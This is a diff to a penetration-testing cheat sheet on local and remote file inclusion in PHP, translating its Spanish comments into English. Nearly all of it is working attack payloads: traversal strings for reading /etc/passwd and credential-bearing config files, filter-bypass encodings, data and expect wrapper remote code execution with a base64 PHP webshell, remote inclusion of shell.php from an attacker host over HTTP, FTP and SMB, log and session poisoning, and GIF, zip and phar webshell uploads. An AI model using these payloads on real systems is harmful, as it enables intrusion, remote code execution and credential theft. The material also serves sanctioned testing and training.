@@ -13,25 +13,25 @@ sidebar:
 ## Detection and Key Files
 
 ```bash
-# Detección básica — rutas absolutas
+# Basic detection — absolute paths
 ?language=/etc/passwd
 ?language=C:\Windows\boot.ini
 
-# Detección con path traversal
+# Detection with path traversal
 ?language=../../../../etc/passwd
 ?language=../../../../Windows/win.ini
 
-# Archivos de lectura frecuente en LFI
-/etc/passwd                           # usuarios del sistema
-/etc/hosts                            # hosts internos
+# Frequently read files in LFI
+/etc/passwd                           # system users
+/etc/hosts                            # internal hosts
 /etc/hostname
-/proc/self/environ                    # variables de entorno (User-Agent incluido)
-/proc/self/cmdline                    # proceso actual
-/proc/net/fib_trie                    # IPs internas
-/var/www/html/config.php              # credenciales de BD
-/etc/apache2/apache2.conf             # config Apache
-/etc/nginx/nginx.conf                 # config Nginx
-/etc/php/7.4/apache2/php.ini          # configuración PHP (probar versiones 7.x, 8.x)
+/proc/self/environ                    # environment variables (User-Agent included)
+/proc/self/cmdline                    # current process
+/proc/net/fib_trie                    # internal IPs
+/var/www/html/config.php              # DB credentials
+/etc/apache2/apache2.conf             # Apache config
+/etc/nginx/nginx.conf                 # Nginx config
+/etc/php/7.4/apache2/php.ini          # PHP configuration (test versions 7.x, 8.x)
 C:\Windows\System32\drivers\etc\hosts
 C:\inetpub\wwwroot\web.config
 ```
@@ -41,17 +41,17 @@ C:\inetpub\wwwroot\web.config
 ## Path Traversal
 
 ```bash
-# Ruta absoluta directa
+# Direct absolute path
 ?language=/etc/passwd
 
-# Path traversal relativo (preferido — funciona incluso con prefijos de directorio)
+# Relative path traversal (preferred — works even with directory prefixes)
 ?language=../../../../etc/passwd
 
-# Muchos ../ no rompen nada — llegan al root y se quedan ahí
+# Many ../ do not break anything — they reach the root and stay there
 ?language=../../../../../../../../../../../etc/passwd
 
-# Prefijo de directorio en código (include("./lang/" . $param))
-# Usar / al inicio para que el prefijo sea tratado como directorio
+# Directory prefix in code (include("./lang/" . $param))
+# Use / at the beginning so the prefix is treated as a directory
 ?language=/../../../etc/passwd
 ```
 
@@ -62,10 +62,10 @@ C:\inetpub\wwwroot\web.config
 ### Non-Recursive Filter (`str_replace('../', '', input)`)
 
 ```bash
-# ....// → tras eliminar ../ queda ../
+# ....// -> after removing ../, ../ remains
 ?language=....//....//....//etc/passwd
 
-# Variantes
+# Variants
 ?language=..././..././..././etc/passwd
 ?language=....\/....\/....\/etc/passwd
 ```
@@ -76,27 +76,27 @@ C:\inetpub\wwwroot\web.config
 # . = %2e / = %2f
 ?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 
-# Double encoding (para WAFs que descodifican una vez)
+# Double encoding (for WAFs that decode once)
 ?language=%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```
 
 ### Approved Path Bypass (regex `^./languages/`)
 
 ```bash
-# Empezar con el path aprobado, luego traversal
+# Start with approved path, then traversal
 ?language=./languages/../../../../etc/passwd
 ```
 
 ### Extension Added by Code (`include($param . ".php")`)
 
 ```bash
-# Null byte — PHP < 5.5 (obsoleto en PHP moderno)
+# Null byte — PHP < 5.5 (obsolete in modern PHP)
 ?language=../../../../etc/passwd%00
 
 # Path truncation — PHP < 5.3 (string max 4096 chars)
-# El .php añadido se trunca al superar 4096 chars
-?language=non_existing/../../../etc/passwd/./././././././[...repetir ~2048 veces]
-# Generar automáticamente:
+# The appended .php is truncated upon exceeding 4096 chars
+?language=non_existing/../../../etc/passwd/./././././././[...repeat ~2048 times]
+# Automatically generate:
 echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 ```
 
@@ -107,30 +107,30 @@ echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n ".
 ### Reading PHP Source Code (base64 filter)
 
 ```bash
-# Leer source code de un archivo PHP
+# Read source code of a PHP file
 ?language=php://filter/read=convert.base64-encode/resource=config
-# Si la extensión .php se añade automáticamente, resource=config → config.php
+# If the extension .php is added automatically, resource=config -> config.php
 
-# Decodificar en local
+# Decode locally
 echo 'PD9waHAK...' | base64 -d
 
-# Verificar allow_url_include en php.ini
+# Verify allow_url_include in php.ini
 curl "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | grep -a 'allow_url_include'
-# Decodificar el output y grep:
+# Decode output and grep:
 echo '...' | base64 -d | grep allow_url_include
 ```
 
 ### RCE — data Wrapper (requires `allow_url_include = On`)
 
 ```bash
-# Codificar webshell en base64
+# Encode webshell in base64
 echo '<?php system($_GET["cmd"]); ?>' | base64
 # PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 
-# Inyectar vía data wrapper
+# Inject via data wrapper
 ?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 
-# Con curl
+# With curl
 curl -s 'http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
 ```
 
@@ -144,10 +144,10 @@ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
 ### RCE — expect Wrapper (requires `expect` extension installed)
 
 ```bash
-# Verificar si expect está disponible
+# Verify if expect is available
 echo '...' | base64 -d | grep expect
 
-# Ejecutar comando directamente
+# Execute command directly
 ?language=expect://id
 curl -s "http://target/index.php?language=expect://id"
 ```
@@ -157,21 +157,21 @@ curl -s "http://target/index.php?language=expect://id"
 ## RFI — Remote File Inclusion
 
 ```bash
-# Verificar RFI (probar URL local primero — evita firewall)
+# Verify RFI (test local URL first — avoids firewall)
 ?language=http://127.0.0.1:80/index.php
 
-# RFI vía HTTP
+# RFI via HTTP
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 sudo python3 -m http.server 80
 ?language=http://OUR_IP/shell.php&cmd=id
 
-# RFI vía FTP (útil si HTTP está bloqueado)
+# RFI via FTP (useful if HTTP is blocked)
 sudo python -m pyftpdlib -p 21
 ?language=ftp://OUR_IP/shell.php&cmd=id
-# Con credenciales:
+# With credentials:
 ?language=ftp://user:pass@OUR_IP/shell.php&cmd=id
 
-# RFI vía SMB (Windows — no necesita allow_url_include)
+# RFI via SMB (Windows — does not need allow_url_include)
 impaket-smbserver -smb2support share $(pwd)
 ?language=\\OUR_IP\share\shell.php&cmd=whoami
 ```
@@ -183,19 +183,19 @@ impaket-smbserver -smb2support share $(pwd)
 ### Apache/Nginx access.log via User-Agent
 
 ```bash
-# Paso 1: verificar acceso al log
+# Step 1: verify log access
 ?language=/var/log/apache2/access.log
 ?language=/var/log/nginx/access.log
 ?language=../../../../var/log/apache2/access.log
 
-# Paso 2: inyectar PHP en User-Agent (via Burp o curl)
+# Step 2: inject PHP in User-Agent (via Burp or curl)
 curl -s "http://target/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
 
-# Alternativa con archivo:
+# Alternative with file:
 echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > poison
 curl -s "http://target/index.php" -H @poison
 
-# Paso 3: incluir el log + ejecutar comando
+# Step 3: include the log + execute command
 ?language=/var/log/apache2/access.log&cmd=id
 ```
 
@@ -210,34 +210,34 @@ C:\xampp\apache\logs\access.log # Windows
 /var/log/nginx/access.log       # Linux
 C:\nginx\log\access.log         # Windows
 
-# Otros logs envenenables
-/var/log/sshd.log               # SSH: usar usuario malicioso en login
-/var/log/vsftpd.log             # FTP: usuario malicioso
-/var/log/mail                   # Mail: enviar email con PHP code
+# Other poisonable logs
+/var/log/sshd.log               # SSH: use malicious user in login
+/var/log/vsftpd.log             # FTP: malicious user
+/var/log/mail                   # Mail: send email with PHP code
 
-# /proc (si no hay acceso a logs)
-/proc/self/environ              # User-Agent en env
-/proc/self/fd/N                 # FDs del proceso (N: 0-50)
+# /proc (if no access to logs)
+/proc/self/environ              # User-Agent in env
+/proc/self/fd/N                 # FDs of the process (N: 0-50)
 ```
 
 ### Session Poisoning (PHP)
 
 ```bash
-# Paso 1: encontrar el archivo de sesión
-# PHPSESSID cookie → /var/lib/php/sessions/sess_<PHPSESSID>
-# Ejemplo: PHPSESSID=abc123 → /var/lib/php/sessions/sess_abc123
+# Step 1: find session file
+# PHPSESSID cookie -> /var/lib/php/sessions/sess_<PHPSESSID>
+# Example: PHPSESSID=abc123 -> /var/lib/php/sessions/sess_abc123
 
-# Paso 2: leer el archivo de sesión vía LFI
+# Step 2: read session file via LFI
 ?language=/var/lib/php/sessions/sess_abc123
 
-# Paso 3: inyectar PHP en un parámetro que se almacene en sesión
+# Step 3: inject PHP in a parameter stored in session
 ?language=<?php system($_GET['cmd']); ?>
 # URL encoded: %3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 
-# Paso 4: incluir la sesión + ejecutar
+# Step 4: include session + execute
 ?language=/var/lib/php/sessions/sess_abc123&cmd=id
 
-# Rutas de sesiones
+# Session paths
 /var/lib/php/sessions/          # Linux
 C:\Windows\Temp\                # Windows
 ```
@@ -249,34 +249,34 @@ C:\Windows\Temp\                # Windows
 ### GIF Webshell (Preferred Method)
 
 ```bash
-# Crear imagen maliciosa con PHP
+# Create malicious image with PHP
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
-# GIF8 = magic bytes para pasar validación de tipo de archivo
+# GIF8 = magic bytes to pass file type validation
 
-# Subir via formulario de profile/avatar
-# Obtener ruta del archivo subido desde el src del img en el HTML:
+# Upload via profile/avatar form
+# Obtain uploaded file path from the img src in the HTML:
 # <img src="/profile_images/shell.gif">
 
-# Incluir vía LFI + ejecutar
+# Include via LFI + execute
 ?language=./profile_images/shell.gif&cmd=id
 ```
 
 ### Zip Wrapper
 
 ```bash
-# Crear webshell + comprimir como imagen
+# Create webshell + compress as image
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 zip shell.jpg shell.php
 
-# Incluir con zip wrapper
+# Include with zip wrapper
 ?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
-# %23 = # (separador del archivo dentro del zip)
+# %23 = # (separator of the file inside the zip)
 ```
 
 ### Phar Wrapper
 
 ```php
-// shell.php — generar archivo phar
+// shell.php — generate phar file
 <?php
 $phar = new Phar('shell.phar');
 $phar->startBuffering();
@@ -287,12 +287,12 @@ $phar->stopBuffering();
 ```
 
 ```bash
-# Compilar y renombrar
+# Compile and rename
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 
-# Incluir con phar wrapper
+# Include with phar wrapper
 ?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
-# %2F = / (separador sub-archivo)
+# %2F = / (sub-file separator)
 ```
 
 ---
@@ -300,15 +300,15 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ## Automated Fuzzing
 
 ```bash
-# Fuzzing de parámetros LFI
+# Fuzzing LFI parameters
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
   -u 'http://target/index.php?FUZZ=value' -fs 2287
 
-# Fuzzing de payloads LFI
+# Fuzzing LFI payloads
 ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
   -u 'http://target/index.php?language=FUZZ' -fs 2287
 
-# Fuzzing de archivos PHP disponibles
+# Fuzzing available PHP files
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
   -u http://target/FUZZ.php
 ```
